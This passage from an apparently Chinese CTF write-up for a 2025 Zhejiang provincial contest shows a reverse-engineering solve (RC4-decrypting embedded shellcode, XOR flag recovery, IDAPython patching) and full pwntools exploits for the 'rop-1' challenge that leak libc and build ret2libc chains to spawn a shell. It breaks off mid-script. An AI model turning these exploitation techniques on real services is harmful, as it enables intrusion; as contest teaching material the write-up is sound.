class="hljs-number">0x00</span>,<span class="hljs-number">0x7F</span>,<span class="hljs-number">0x96</span>,<span class="hljs-number">0xE4</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x0C</span>,<span class="hljs-number">0x0B</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0xEA</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0xB6</span>,<span class="hljs-number">0xE5</span>,<span class="hljs-number">0xDE</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0xB5</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x4E</span>,<span class="hljs-number">0x8D</span>,<span class="hljs-number">0x1F</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0xCD</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x19</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x93</span>,<span class="hljs-number">0x5F</span>,<span class="hljs-number">0xC1</span>,<span class="hljs-number">0x30</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0xD0</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x4D</span>,<span class="hljs-number">0xB6</span>,<span class="hljs-number">0x99</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x3B</span>,<span class="hljs-number">0xBE</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x4E</span>,<span class="hljs-number">0x9B</span>,<span class="hljs-number">0x18</span>,<span class="hljs-number">0x6D</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x99</span>,<span class="hljs-number">0xB2</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0xEC</span>,<span class="hljs-number">0x6C</span>,<span class="hljs-number">0xDF</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0x8A</span>,<span class="hljs-number">0x84</span>,<span class="hljs-number">0x3A</span>,<span class="hljs-number">0xF3</span>,<span class="hljs-number">0x5D</span>,<span class="hljs-number">0xC8</span>,<span class="hljs-number">0xE9</span>,<span class="hljs-number">0x88</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x9D</span>,<span class="hljs-number">0x5B</span>,<span class="hljs-number">0x4F</span>,<span class="hljs-number">0x1D</span>,<span class="hljs-number">0xC1</span>,<span class="hljs-number">0x16</span>,<span class="hljs-number">0xB5</span>,<span class="hljs-number">0x96</span>,<span class="hljs-number">0xC4</span>,<span class="hljs-number">0x8C</span>,<span class="hljs-number">0xFB</span>,<span class="hljs-number">0xEA</span>,<span class="hljs-number">0xA2</span>,<span class="hljs-number">0x16</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x8E</span>,<span class="hljs-number">0xE4</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0x99</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x4A</span>,<span class="hljs-number">0x4F</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br>data = a<br>key = <span class="hljs-string">b&#x27;babyflag&#x27;</span><br>decrypted = rc4(data, key)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;shellcode&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(decrypted)<br></code></pre></td></tr></table></figure><p>å¯¼å‡ºåæ”¾å…¥idaä¹Ÿèƒ½çœ‹åˆ°åŠ å¯†</p><img src="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/1762613075325-c8694ec6-44c7-4217-af1c-b616d46464fb-176328318663821.png" class="" title="img"><p>a1æ˜¯è¾“å…¥ï¼Œç›´æ¥å¼‚æˆ–æ±‚å¾—flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x20014077</span>,<span class="hljs-number">0x770A1073</span>,<span class="hljs-number">0x7C0B4320</span>,<span class="hljs-number">0x73524472</span>,<span class="hljs-number">0x73501128</span>,<span class="hljs-number">0x77041321</span>,<span class="hljs-number">0x72524721</span>]<br>v4 = <span class="hljs-number">0x44332211</span><br><span class="hljs-comment">#print(0x20^0x44)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((a[i]&amp;<span class="hljs-number">0xff</span>)^(v4&amp;<span class="hljs-number">0xff</span>)),end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((a[i]&gt;&gt;<span class="hljs-number">8</span> &amp; <span class="hljs-number">0xff</span>) ^ (v4&gt;&gt;<span class="hljs-number">8</span> &amp; <span class="hljs-number">0xff</span>)), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((a[i] &gt;&gt; <span class="hljs-number">16</span> &amp; <span class="hljs-number">0xff</span>) ^ (v4 &gt;&gt; <span class="hljs-number">16</span> &amp; <span class="hljs-number">0xff</span>)), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((a[i] &gt;&gt; <span class="hljs-number">24</span> &amp; <span class="hljs-number">0xff</span>) ^ (v4 &gt;&gt; <span class="hljs-number">24</span> &amp; <span class="hljs-number">0xff</span>)), end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">#fb2db2931a88cfa793c701730ea6</span><br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç”¨idapythonæ‰¹é‡ä¿®æ”¹å­—èŠ‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ida_bytes<br><br>start_address = <span class="hljs-number">0x7FF780312620</span><br><br>byte_list = [<span class="hljs-string">&#x27;0x40&#x27;</span>, <span class="hljs-string">&#x27;0x55&#x27;</span>, <span class="hljs-string">&#x27;0x48&#x27;</span>, <span class="hljs-string">&#x27;0x8b&#x27;</span>, <span class="hljs-string">&#x27;0xec&#x27;</span>, <span class="hljs-string">&#x27;0x48&#x27;</span>, <span class="hljs-string">&#x27;0x83&#x27;</span>, <span class="hljs-string">&#x27;0xec&#x27;</span>, <span class="hljs-string">&#x27;0x20&#x27;</span>, <span class="hljs-string">&#x27;0x4c&#x27;</span>, <span class="hljs-string">&#x27;0x8b&#x27;</span>, <span class="hljs-string">&#x27;0xc9&#x27;</span>, <span class="hljs-string">&#x27;0x48&#x27;</span>, <span class="hljs-string">&#x27;0x85&#x27;</span>, <span class="hljs-string">&#x27;0xc9&#x27;</span>, <span class="hljs-string">&#x27;0xf&#x27;</span>, <span class="hljs-string">&#x27;0x84&#x27;</span>, <span class="hljs-string">&#x27;0x7c&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0x33&#x27;</span>, <span class="hljs-string">&#x27;0xc0&#x27;</span>, <span class="hljs-string">&#x27;0xc7&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0xe0&#x27;</span>, <span class="hljs-string">&#x27;0x77&#x27;</span>, <span class="hljs-string">&#x27;0x40&#x27;</span>, <span class="hljs-string">&#x27;0x1&#x27;</span>, <span class="hljs-string">&#x27;0x20&#x27;</span>, <span class="hljs-string">&#x27;0x48&#x27;</span>, <span class="hljs-string">&#x27;0x8d&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0xe0&#x27;</span>, <span class="hljs-string">&#x27;0xc7&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0xe4&#x27;</span>, <span class="hljs-string">&#x27;0x73&#x27;</span>, <span class="hljs-string">&#x27;0x10&#x27;</span>, <span class="hljs-string">&#x27;0xa&#x27;</span>, <span class="hljs-string">&#x27;0x77&#x27;</span>, <span class="hljs-string">&#x27;0x4c&#x27;</span>, <span class="hljs-string">&#x27;0x2b&#x27;</span>, <span class="hljs-string">&#x27;0xc8&#x27;</span>, <span class="hljs-string">&#x27;0xc7&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0xe8&#x27;</span>, <span class="hljs-string">&#x27;0x20&#x27;</span>, <span class="hljs-string">&#x27;0x43&#x27;</span>, <span class="hljs-string">&#x27;0xb&#x27;</span>, <span class="hljs-string">&#x27;0x7c&#x27;</span>, <span class="hljs-string">&#x27;0xc7&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0xec&#x27;</span>, <span class="hljs-string">&#x27;0x72&#x27;</span>, <span class="hljs-string">&#x27;0x44&#x27;</span>, <span class="hljs-string">&#x27;0x52&#x27;</span>, <span class="hljs-string">&#x27;0x73&#x27;</span>, <span class="hljs-string">&#x27;0xc7&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0xf0&#x27;</span>, <span class="hljs-string">&#x27;0x28&#x27;</span>, <span class="hljs-string">&#x27;0x11&#x27;</span>, <span class="hljs-string">&#x27;0x50&#x27;</span>, <span class="hljs-string">&#x27;0x73&#x27;</span>, <span class="hljs-string">&#x27;0xc7&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0xf4&#x27;</span>, <span class="hljs-string">&#x27;0x77&#x27;</span>, <span class="hljs-string">&#x27;0x44&#x27;</span>, <span class="hljs-string">&#x27;0x56&#x27;</span>, <span class="hljs-string">&#x27;0x20&#x27;</span>, <span class="hljs-string">&#x27;0xc7&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0xf8&#x27;</span>, <span class="hljs-string">&#x27;0x21&#x27;</span>, <span class="hljs-string">&#x27;0x13&#x27;</span>, <span class="hljs-string">&#x27;0x4&#x27;</span>, <span class="hljs-string">&#x27;0x77&#x27;</span>, <span class="hljs-string">&#x27;0xc7&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0xfc&#x27;</span>, <span class="hljs-string">&#x27;0x21&#x27;</span>, <span class="hljs-string">&#x27;0x47&#x27;</span>, <span class="hljs-string">&#x27;0x52&#x27;</span>, <span class="hljs-string">&#x27;0x72&#x27;</span>, <span class="hljs-string">&#x27;0xc7&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0x10&#x27;</span>, <span class="hljs-string">&#x27;0x11&#x27;</span>, <span class="hljs-string">&#x27;0x22&#x27;</span>, <span class="hljs-string">&#x27;0x33&#x27;</span>, <span class="hljs-string">&#x27;0x44&#x27;</span>, <span class="hljs-string">&#x27;0x66&#x27;</span>, <span class="hljs-string">&#x27;0x90&#x27;</span>, <span class="hljs-string">&#x27;0x49&#x27;</span>, <span class="hljs-string">&#x27;0x8b&#x27;</span>, <span class="hljs-string">&#x27;0xc0&#x27;</span>, <span class="hljs-string">&#x27;0x48&#x27;</span>, <span class="hljs-string">&#x27;0x8d&#x27;</span>, <span class="hljs-string">&#x27;0x55&#x27;</span>, <span class="hljs-string">&#x27;0xe0&#x27;</span>, <span class="hljs-string">&#x27;0x83&#x27;</span>, <span class="hljs-string">&#x27;0xe0&#x27;</span>, <span class="hljs-string">&#x27;0x3&#x27;</span>, <span class="hljs-string">&#x27;0x49&#x27;</span>, <span class="hljs-string">&#x27;0x3&#x27;</span>, <span class="hljs-string">&#x27;0xd0&#x27;</span>, <span class="hljs-string">&#x27;0xf&#x27;</span>, <span class="hljs-string">&#x27;0xb6&#x27;</span>, <span class="hljs-string">&#x27;0x4c&#x27;</span>, <span class="hljs-string">&#x27;0x5&#x27;</span>, <span class="hljs-string">&#x27;0x10&#x27;</span>, <span class="hljs-string">&#x27;0x41&#x27;</span>, <span class="hljs-string">&#x27;0xf&#x27;</span>, <span class="hljs-string">&#x27;0xbe&#x27;</span>, <span class="hljs-string">&#x27;0x4&#x27;</span>, <span class="hljs-string">&#x27;0x11&#x27;</span>, <span class="hljs-string">&#x27;0x33&#x27;</span>, <span class="hljs-string">&#x27;0xc8&#x27;</span>, <span class="hljs-string">&#x27;0xf&#x27;</span>, <span class="hljs-string">&#x27;0xb6&#x27;</span>, <span class="hljs-string">&#x27;0x2&#x27;</span>, <span class="hljs-string">&#x27;0x3b&#x27;</span>, <span class="hljs-string">&#x27;0xc1&#x27;</span>, <span class="hljs-string">&#x27;0x75&#x27;</span>, <span class="hljs-string">&#x27;0x11&#x27;</span>, <span class="hljs-string">&#x27;0x49&#x27;</span>, <span class="hljs-string">&#x27;0xff&#x27;</span>, <span class="hljs-string">&#x27;0xc0&#x27;</span>, <span class="hljs-string">&#x27;0x49&#x27;</span>, <span class="hljs-string">&#x27;0x83&#x27;</span>, <span class="hljs-string">&#x27;0xf8&#x27;</span>, <span class="hljs-string">&#x27;0x20&#x27;</span>, <span class="hljs-string">&#x27;0x72&#x27;</span>, <span class="hljs-string">&#x27;0xd7&#x27;</span>, <span class="hljs-string">&#x27;0xb0&#x27;</span>, <span class="hljs-string">&#x27;0x1&#x27;</span>, <span class="hljs-string">&#x27;0x48&#x27;</span>, <span class="hljs-string">&#x27;0x83&#x27;</span>, <span class="hljs-string">&#x27;0xc4&#x27;</span>, <span class="hljs-string">&#x27;0x20&#x27;</span>, <span class="hljs-string">&#x27;0x5d&#x27;</span>, <span class="hljs-string">&#x27;0xc3&#x27;</span>, <span class="hljs-string">&#x27;0x32&#x27;</span>, <span class="hljs-string">&#x27;0xc0&#x27;</span>, <span class="hljs-string">&#x27;0x48&#x27;</span>, <span class="hljs-string">&#x27;0x83&#x27;</span>, <span class="hljs-string">&#x27;0xc4&#x27;</span>, <span class="hljs-string">&#x27;0x20&#x27;</span>, <span class="hljs-string">&#x27;0x5d&#x27;</span>]<br><br>bytes_to_write = [<span class="hljs-built_in">int</span>(byte, <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> byte_list]<br><br><span class="hljs-keyword">for</span> i, byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(bytes_to_write):<br>    ida_bytes.patch_byte(start_address + i, byte)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æˆåŠŸå°† <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(bytes_to_write)&#125;</span> ä¸ªå­—èŠ‚å†™å…¥åœ°å€ 0x<span class="hljs-subst">&#123;start_address:X&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>ç„¶åæŒ‰ç…§èŠ±æŒ‡ä»¤çš„æ–¹å¼ä¿®å¤ï¼Œç¨éº»çƒ¦ï¼Œéœ€è¦ä¸€ç›´undefineç„¶åå¼ºåˆ¶è¯†åˆ«</p><img src="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/1762613513730-1fe4fda7-5aee-4b16-be54-ce89112d8043-176328318663923.png" class="" title="img"><p>æœ€ç»ˆæ•ˆæœå·®ä¸å¤š</p><img src="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/1762613877816-9d1fc5a1-f2b5-4377-8572-1e603236778b-176328318663925.png" class="" title="img"><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="rop-1"><a href="#rop-1" class="headerlink" title="rop-1"></a>rop-1</h2><img src="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/1763104061967-5fb41768-d5e1-48be-b587-a03102ea24b1-176328318663927.png" class="" title="img"><p>è¾“å…¥è¾“å‡ºéƒ½æœ‰æ•´æ•°æº¢å‡ºçš„é—®é¢˜</p><p>atollä¼šæŠŠsä¸­çš„æ•°å­—æå‡ºæ¥æ”¾åˆ°æ ˆä¸Š,è¾“å…¥ä¸€ä¸ª16è¿›åˆ¶æ•°å¾—åˆ°10è¿›åˆ¶æ•°</p><img src="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/1763103729778-f94e2c78-9ea8-4ce7-bc28-d50b03d73726-176328318663929.png" class="" title="img"><p>outputä¼šåœ¨è¾“å‡ºå†…å®¹åå°†è¯¥ä½ç½®å†…å®¹é‡æ–°è®¾ç½®ä¸º0</p><img src="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/1763103740354-febdc60c-f965-4a91-b081-0b5ffc1e7726-176328318663931.png" class="" title="img"><p>é€šè¿‡outputæ³„éœ²åŸºå€ï¼Œç„¶året2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">21565</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):    <br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;    </span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)    <br>    attach(io,bk)  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr_32</span>():<br>    <span class="hljs-keyword">return</span> u32(io.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:])    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>    <span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sb</span>():<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">input</span>(<span class="hljs-params">data</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">b&#x27;number:\n&#x27;</span>, <span class="hljs-built_in">str</span>(data).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">data</span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">b&#x27;index:\n&#x27;</span>, <span class="hljs-built_in">str</span>(data).encode())<br>    ru(<span class="hljs-string">b&#x27;your number:\n&#x27;</span>)<br>    <br>output(-<span class="hljs-number">13</span>)<span class="hljs-comment"># -1</span><br>libc.address = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>),<span class="hljs-number">10</span>)-<span class="hljs-number">378</span>-libc.sym.puts<br> <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc&#x27;</span>, libc.address)<br><span class="hljs-comment">#debug()</span><br><span class="hljs-built_in">input</span>(<span class="hljs-number">0x4014cc</span>)<span class="hljs-comment"># 0ï¼Œç•™ä¸€ä¸ªç©ºåé¢æ”¾retæŒ‡ä»¤ï¼Œè¿™é‡Œç›´æ¥å†™ä¸€ä¸ªä¸»å‡½æ•°çš„åœ°å€å°±è¡Œ</span><br><br>rop = ROP(libc)<br><span class="hljs-built_in">input</span>(rop.find_gadget([<span class="hljs-string">&#x27;pop rdi&#x27;</span>,<span class="hljs-string">&#x27;ret&#x27;</span>])[<span class="hljs-number">0</span>])<span class="hljs-comment"># 1</span><br><span class="hljs-built_in">input</span>(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)))<span class="hljs-comment"># 2</span><br><span class="hljs-built_in">input</span>(libc.sym.system)<span class="hljs-comment"># 3</span><br><br>output(-<span class="hljs-number">12</span>)<br>output(-<span class="hljs-number">13</span>)<br>output(-<span class="hljs-number">13</span>)<br>output(-<span class="hljs-number">13</span>)<br><br><span class="hljs-built_in">input</span>(rop.find_gadget([<span class="hljs-string">&#x27;ret&#x27;</span>])[<span class="hljs-number">0</span>])<br><br>inter()  <br></code></pre></td></tr></table></figure><p>v2ç­‰äº9çš„æ—¶å€™åˆšå¥½è¦†ç›–åˆ°countï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¦†ç›–countæ¥å†³å®šä¸‹æ¬¡å†™å…¥çš„ä½ç½®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):    <br>    <span class="hljs-built_in">input</span>(<span class="hljs-number">10</span>)<br><span class="hljs-built_in">input</span>(<span class="hljs-number">0</span>)<br>output(-<span class="hljs-number">13</span>)  <span class="hljs-comment">#-1çš„æ—¶å€™åˆšå¥½å¯ä»¥æ”¹åˆ°ret_addr</span><br>libc_addr = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">10</span>) - <span class="hljs-number">378</span> - libc.sym.puts<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc&#x27;</span>, <span class="hljs-built_in">hex</span>(libc_addr))<br><br>pop_rdi_ret = <span class="hljs-number">0x401563</span><br>binsh_addr = libc_addr + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br>system_addr = libc_addr + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>ret_addr = <span class="hljs-number">0x40101a</span><br><span class="hljs-built_in">input</span>(pop_rdi_ret)<br><span class="hljs-comment">#debug()</span><br><span class="hljs-built_in">input</span>(binsh_addr)<br><span class="hljs-built_in">input</span>(system_addr)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>-<span class="hljs-number">3</span>):    <br>    <span class="hljs-built_in">input</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">input</span>(-<span class="hljs-number">2</span>)<br><span class="hljs-built_in">input</span>(ret_addr)<br><br>inter()<br></code></pre></td></tr></table></figure><img src="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/1763278801552-b7d9e71e-c491-4c5f-9074-a97bbbf9096a-176328318663933.png" class="" title="img"><p>æˆ–è€…ç›´æ¥æ£€æŸ¥æ¡ä»¶æ‰“one_gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">output(-<span class="hljs-number">13</span>)<br>libc_addr = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span 